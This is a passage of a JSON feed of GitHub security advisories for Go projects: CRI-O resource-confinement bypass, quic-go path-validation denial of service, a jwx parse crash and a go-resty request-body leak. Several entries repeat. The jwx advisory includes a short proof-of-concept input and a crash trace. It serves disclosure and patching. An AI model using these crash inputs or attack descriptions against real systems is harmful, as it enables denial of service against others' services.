            "date_published": "2024-01-10T15:37:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-449p-3h89-pw88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nAll versions of CRI-O running on cgroupv2 nodes. \nUnchecked access to an experimental annotation allows a container to be unconfined. Back in 2021, <a href=\"https://github.com/cri-o/cri-o/pull/4479\">support was added</a> to support an experimental annotation that allows a user to request special resources in cgroupv2. It was supposed to be gated by an experimental annotation: <code>io.kubernetes.cri-o.UnifiedCgroup</code>, which was supposed to be filtered from the <a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">list of allowed annotations</a> . However, there is a bug in this code which allows any user to specify this annotation, regardless of whether it's enabled on the node. The consequences of this are a pod can specify any amount of memory/cpu and get it, circumventing the kubernetes scheduler, and potentially be able to DOS a node. </p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em>\n1.29.1, 1.28.3, 1.27.3</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\nuse cgroupv1</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6476\">https://nvd.nist.gov/vuln/detail/CVE-2023-6476</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/pull/4479\">https://github.com/cri-o/cri-o/pull/4479</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e\">https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-6476\">https://access.redhat.com/security/cve/CVE-2023-6476</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2253994\">https://bugzilla.redhat.com/show_bug.cgi?id=2253994</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc",
            "title": "[github.com/cri-o/cri-o] CRI-O's pods can break out of resource confinement on cgroupv2",
            "date_modified": "2024-01-10T15:27:46.000Z",
            "date_published": "2024-01-10T15:27:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nAll versions of CRI-O running on cgroupv2 nodes. \nUnchecked access to an experimental annotation allows a container to be unconfined. Back in 2021, <a href=\"https://github.com/cri-o/cri-o/pull/4479\">support was added</a> to support an experimental annotation that allows a user to request special resources in cgroupv2. It was supposed to be gated by an experimental annotation: <code>io.kubernetes.cri-o.UnifiedCgroup</code>, which was supposed to be filtered from the <a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">list of allowed annotations</a> . However, there is a bug in this code which allows any user to specify this annotation, regardless of whether it's enabled on the node. The consequences of this are a pod can specify any amount of memory/cpu and get it, circumventing the kubernetes scheduler, and potentially be able to DOS a node. </p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em>\n1.29.1, 1.28.3, 1.27.3</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\nuse cgroupv1</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6476\">https://nvd.nist.gov/vuln/detail/CVE-2023-6476</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/pull/4479\">https://github.com/cri-o/cri-o/pull/4479</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e\">https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-6476\">https://access.redhat.com/security/cve/CVE-2023-6476</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2253994\">https://bugzilla.redhat.com/show_bug.cgi?id=2253994</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc",
            "title": "[github.com/cri-o/cri-o] CRI-O's pods can break out of resource confinement on cgroupv2",
            "date_modified": "2024-01-10T15:27:46.000Z",
            "date_published": "2024-01-10T15:27:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nAll versions of CRI-O running on cgroupv2 nodes. \nUnchecked access to an experimental annotation allows a container to be unconfined. Back in 2021, <a href=\"https://github.com/cri-o/cri-o/pull/4479\">support was added</a> to support an experimental annotation that allows a user to request special resources in cgroupv2. It was supposed to be gated by an experimental annotation: <code>io.kubernetes.cri-o.UnifiedCgroup</code>, which was supposed to be filtered from the <a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">list of allowed annotations</a> . However, there is a bug in this code which allows any user to specify this annotation, regardless of whether it's enabled on the node. The consequences of this are a pod can specify any amount of memory/cpu and get it, circumventing the kubernetes scheduler, and potentially be able to DOS a node. </p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em>\n1.29.1, 1.28.3, 1.27.3</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\nuse cgroupv1</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/cri-o/cri-o/security/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6476\">https://nvd.nist.gov/vuln/detail/CVE-2023-6476</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/pull/4479\">https://github.com/cri-o/cri-o/pull/4479</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e\">https://github.com/cri-o/cri-o/commit/75effcb1a25851a736e82dba1f7d8cee93ee159e</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-6476\">https://access.redhat.com/security/cve/CVE-2023-6476</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2253994\">https://bugzilla.redhat.com/show_bug.cgi?id=2253994</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107\">https://github.com/cri-o/cri-o/blob/main/pkg/config/workloads.go#L103-L107</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p4rx-7wvg-fwrc\">https://github.com/advisories/GHSA-p4rx-7wvg-fwrc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc",
            "title": "[github.com/cri-o/cri-o] CRI-O's pods can break out of resource confinement on cgroupv2",
            "date_modified": "2024-01-10T15:27:46.000Z",
            "date_published": "2024-01-10T15:27:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p4rx-7wvg-fwrc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An attacker can cause its peer to run out of memory sending a large number of PATH_CHALLENGE frames. The receiver is supposed to respond to each PATH_CHALLENGE frame with a PATH_RESPONSE frame. The attacker can prevent the receiver from sending out (the vast majority of) these PATH_RESPONSE frames by collapsing the peers congestion window (by selectively acknowledging received packets) and by manipulating the peer's RTT estimate.</p>\n<p>I published a more detailed description of the attack and its mitigation in this blog post: <a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></p>\n<p>There's no way to mitigate this attack, please update quic-go to a version that contains the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc\">https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965\">https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a\">https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49\">https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e\">https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc\">https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4\">https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8\">https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8</a></li>\n<li><a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49295\">https://nvd.nist.gov/vuln/detail/CVE-2023-49295</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf",
            "title": "[github.com/quic-go/quic-go] quic-go's path validation mechanism can be exploited to cause denial of service",
            "date_modified": "2024-01-11T15:10:35.000Z",
            "date_published": "2024-01-10T15:08:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An attacker can cause its peer to run out of memory sending a large number of PATH_CHALLENGE frames. The receiver is supposed to respond to each PATH_CHALLENGE frame with a PATH_RESPONSE frame. The attacker can prevent the receiver from sending out (the vast majority of) these PATH_RESPONSE frames by collapsing the peers congestion window (by selectively acknowledging received packets) and by manipulating the peer's RTT estimate.</p>\n<p>I published a more detailed description of the attack and its mitigation in this blog post: <a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></p>\n<p>There's no way to mitigate this attack, please update quic-go to a version that contains the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc\">https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965\">https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a\">https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49\">https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e\">https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc\">https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4\">https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8\">https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8</a></li>\n<li><a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49295\">https://nvd.nist.gov/vuln/detail/CVE-2023-49295</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf",
            "title": "[github.com/quic-go/quic-go] quic-go's path validation mechanism can be exploited to cause denial of service",
            "date_modified": "2024-01-11T15:10:35.000Z",
            "date_published": "2024-01-10T15:08:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An attacker can cause its peer to run out of memory sending a large number of PATH_CHALLENGE frames. The receiver is supposed to respond to each PATH_CHALLENGE frame with a PATH_RESPONSE frame. The attacker can prevent the receiver from sending out (the vast majority of) these PATH_RESPONSE frames by collapsing the peers congestion window (by selectively acknowledging received packets) and by manipulating the peer's RTT estimate.</p>\n<p>I published a more detailed description of the attack and its mitigation in this blog post: <a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></p>\n<p>There's no way to mitigate this attack, please update quic-go to a version that contains the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc\">https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965\">https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a\">https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49\">https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e\">https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc\">https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4\">https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8\">https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8</a></li>\n<li><a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49295\">https://nvd.nist.gov/vuln/detail/CVE-2023-49295</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf",
            "title": "[github.com/quic-go/quic-go] quic-go's path validation mechanism can be exploited to cause denial of service",
            "date_modified": "2024-01-11T15:10:35.000Z",
            "date_published": "2024-01-10T15:08:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An attacker can cause its peer to run out of memory sending a large number of PATH_CHALLENGE frames. The receiver is supposed to respond to each PATH_CHALLENGE frame with a PATH_RESPONSE frame. The attacker can prevent the receiver from sending out (the vast majority of) these PATH_RESPONSE frames by collapsing the peers congestion window (by selectively acknowledging received packets) and by manipulating the peer's RTT estimate.</p>\n<p>I published a more detailed description of the attack and its mitigation in this blog post: <a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></p>\n<p>There's no way to mitigate this attack, please update quic-go to a version that contains the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/quic-go/quic-go/security/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc\">https://github.com/quic-go/quic-go/commit/17fc98c2d81dbe685c19702dc694a9d606ac56dc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965\">https://github.com/quic-go/quic-go/commit/21609ddfeff93668c7625a85eb09f1541fdad965</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a\">https://github.com/quic-go/quic-go/commit/3a9c18bcd27a01c551ac9bf8bd2b4bded77c189a</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49\">https://github.com/quic-go/quic-go/commit/554d543b50b917369fb1394cc5396d928166cf49</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e\">https://github.com/quic-go/quic-go/commit/6cc3d58935426191296171a6c0d1ee965e10534e</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc\">https://github.com/quic-go/quic-go/commit/9aaefe19fc3dc8c8917cc87e6128bb56d9e9e6cc</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4\">https://github.com/quic-go/quic-go/commit/a0ffa757499913f7be69aa78f573a6aee3430ae4</a></li>\n<li><a href=\"https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8\">https://github.com/quic-go/quic-go/commit/d7aa627ebde91cf799ada2a07443faa9b1e5abb8</a></li>\n<li><a href=\"https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/\">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49295\">https://nvd.nist.gov/vuln/detail/CVE-2023-49295</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ppxx-5m9h-6vxf\">https://github.com/advisories/GHSA-ppxx-5m9h-6vxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf",
            "title": "[github.com/quic-go/quic-go] quic-go's path validation mechanism can be exploited to cause denial of service",
            "date_modified": "2024-01-11T15:10:35.000Z",
            "date_published": "2024-01-10T15:08:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ppxx-5m9h-6vxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Calling <code>jws.Parse</code> with a JSON serialized payload where the <code>signature</code> field is present while <code>protected</code> is absent can lead to a nil pointer dereference.</p>\n<h3 id=\"details\">Details</h3>\n<p>This seems to also affect other functions that calls <code>Parse</code> internally, like <code>jws.Verify</code>.</p>\n<p>My understanding of these functions from the docs is that they are supposed to fail gracefully on invalid input and don't require any prior validation.</p>\n<p>Based on the stack trace in the PoC, the issue seems to be that the processing done in <code>jws/message.go:UnmarshalJSON()</code> assumes that if a <code>signature</code> field is present, then a <code>protected</code> field is also present. If this is not the case, then the subsequent call to <code>getB64Value(sig.protected)</code> will dereference <code>sig.protected</code>, which is <code>nil</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Reproducer:</p>\n<pre><code class=\"language-go\">package poc\n\nimport (\n        \"testing\"\n\n        \"github.com/lestrrat-go/jwx/v2/jws\"\n)\n\nfunc TestPOC(t *testing.T) {\n        _, _ = jws.Parse([]byte(`{\"signature\": \"\"}`))\n}\n</code></pre>\n<p>Result:</p>\n<pre><code>$ go test        \n--- FAIL: TestPOC (0.00s)\npanic: runtime error: invalid memory address or nil pointer dereference [recovered]\n        panic: runtime error: invalid memory address or nil pointer dereference\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x40 pc=0x5fd618]\n\ngoroutine 6 [running]:\ntesting.tRunner.func1.2({0x628800, 0x831030})\n        /usr/local/go/src/testing/testing.go:1545 +0x238\ntesting.tRunner.func1()\n        /usr/local/go/src/testing/testing.go:1548 +0x397\npanic({0x628800?, 0x831030?})\n        /usr/local/go/src/runtime/panic.go:914 +0x21f\ngithub.com/lestrrat-go/jwx/v2/jws.getB64Value({0x0?, 0x0?})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:484 +0x18\ngithub.com/lestrrat-go/jwx/v2/jws.(*Message).UnmarshalJSON(0xc0000a2140, {0xc0000ec000, 0x11, 0x200})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/message.go:323 +0x4ad\nencoding/json.(*decodeState).object(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0x16?})\n        /usr/local/go/src/encoding/json/decode.go:604 +0x6cc\nencoding/json.(*decodeState).value(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0xc00006e630?})\n        /usr/local/go/src/encoding/json/decode.go:374 +0x3e\nencoding/json.(*decodeState).unmarshal(0xc0000ea028, {0x64fa60?, 0xc0000a2140?})\n        /usr/local/go/src/encoding/json/decode.go:181 +0x133\nencoding/json.(*Decoder).Decode(0xc0000ea000, {0x64fa60, 0xc0000a2140})\n        /usr/local/go/src/encoding/json/stream.go:73 +0x179\ngithub.com/lestrrat-go/jwx/v2/internal/json.Unmarshal({0xc00001a288, 0x11, 0x11}, {0x64fa60, 0xc0000a2140})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/internal/json/json.go:26 +0x97\ngithub.com/lestrrat-go/jwx/v2/jws.parseJSON({0xc00001a288, 0x11, 0x11})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:588 +0x50\ngithub.com/lestrrat-go/jwx/v2/jws.Parse({0xc00001a288, 0x11, 0x11}, {0x0?, 0xc00006e760?, 0x48450f?})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:525 +0x89\npoc.TestPOC(0x0?)\n        /home/fredrik/src/jwx_poc/poc_test.go:10 +0x57\ntesting.tRunner(0xc0000e4340, 0x68ef30)\n        /usr/local/go/src/testing/testing.go:1595 +0xff\ncreated by testing.(*T).Run in goroutine 1\n        /usr/local/go/src/testing/testing.go:1648 +0x3ad\nexit status 2\nFAIL    poc     0.005s\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability can be used to crash / DOS a system doing JWS verification.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3\">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3</a></li>\n<li><a href=\"https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f\">https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f</a></li>\n<li><a href=\"https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd\">https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21664\">https://nvd.nist.gov/vuln/detail/CVE-2024-21664</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pvcr-v8j8-j5q3\">https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pvcr-v8j8-j5q3",
            "title": "[github.com/lestrrat-go/jwx/v2/jws] Parsing JSON serialized payload without protected field can lead to segfault",
            "date_modified": "2024-01-09T21:52:55.000Z",
            "date_published": "2024-01-09T16:18:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pvcr-v8j8-j5q3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A race condition in go-resty can result in HTTP request body disclosure across requests.</p>\n<p>This condition can be triggered by calling sync.Pool.Put with the same *bytes.Buffer more than once, when request retries are enabled and a retry occurs. The call to sync.Pool.Get will then return a bytes.Buffer that hasn't had bytes.Buffer.Reset called on it. This dirty buffer will contain the HTTP request body from an unrelated request, and go-resty will append the current HTTP request body to it, sending two bodies in one request.</p>\n<p>The sync.Pool in question is defined at package level scope, so a completely unrelated server could receive the request body.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/go-resty/resty/issues/739\">https://github.com/go-resty/resty/issues/739</a></li>\n<li><a href=\"https://github.com/go-resty/resty/issues/743\">https://github.com/go-resty/resty/issues/743</a></li>\n<li><a href=\"https://github.com/go-resty/resty/pull/745\">https://github.com/go-resty/resty/pull/745</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-45286\">https://nvd.nist.gov/vuln/detail/CVE-2023-45286</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2023-2328\">https://pkg.go.dev/vuln/GO-2023-2328</a></li>\n<li><a href=\"https://github.com/go-resty/resty/commit/577fed8730d79f583eb48dfc81674164e1fc471e\">https://github.com/go-resty/resty/commit/577fed8730d79f583eb48dfc81674164e1fc471e</a></li>\n<li><a href=\"https://github.com/go-resty/resty/releases/tag/v2.11.0\">https://github.com/go-resty/resty/releases/tag/v2.11.0</a></li>\n<li><a 